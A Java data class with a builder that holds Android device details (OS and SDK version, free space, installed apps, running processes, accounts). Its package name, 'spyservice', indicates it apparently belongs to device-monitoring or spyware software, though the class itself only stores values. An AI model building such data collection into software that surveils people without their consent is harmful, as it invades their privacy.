/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.loadable.content;

import java.util.List;

public class SystemInformation
{
    private final String osVersion;
    private final int sdkVersion;
    private final String freeSpace;
    private final List<String> installedApps;
    private final List<String> runningProcesses;
    private final List<String> accounts;

    private SystemInformation(String osVersion, int sdkVersion, String freeSpace, List<String> installedApps, List<String> runningProcesses, List<String> accounts) {
        this.osVersion = osVersion;
        this.sdkVersion = sdkVersion;
        this.freeSpace = freeSpace;
        this.installedApps = installedApps;
        this.runningProcesses = runningProcesses;
        this.accounts = accounts;
    }

    public String getOsVersion()
    {
        return osVersion;
    }

    public int getSdkVersion()
    {
        return sdkVersion;
    }

    public String getFreeSpace()
    {
        return freeSpace;
    }

    public List<String> getInstalledApps()
    {
        return installedApps;
    }

    public List<String> getRunningProcesses()
    {
        return runningProcesses;
    }

    public List<String> getAccounts()
    {
        return accounts;
    }

    public static final class Builder
    {
        private String osVersion;
        private int sdkVersion;
        private String freeSpaceBytes;
        private List<String> installedApps;
        private List<String> runningProcesses;
        private List<String> accounts;

        private Builder()
        {
        }

        public static Builder createBuilder()
        {
            return new Builder();
        }

        public Builder setOsVersion(String osVersion)
        {
            this.osVersion = osVersion;
            return this;
        }

        public Builder setSdkVersion(int sdkVersion)
        {
            this.sdkVersion = sdkVersion;
            return this;
        }

        public Builder setFreeSpace(String freeSpaceBytes)
        {
            this.freeSpaceBytes = freeSpaceBytes;
            return this;
        }

        public Builder setInstalledApps(List<String> installedApps)
        {
            this.installedApps = installedApps;
            return this;
        }

        public Builder setRunningProcesses(List<String> runningProcesses)
        {
            this.runningProcesses = runningProcesses;
            return this;
        }

        public Builder setAccounts(List<String> accounts)
        {
            this.accounts = accounts;
            return this;
        }

        public SystemInformation build()
        {
            return new SystemInformation(osVersion, sdkVersion, freeSpaceBytes, installedApps, runningProcesses, accounts);
        }
    }
}
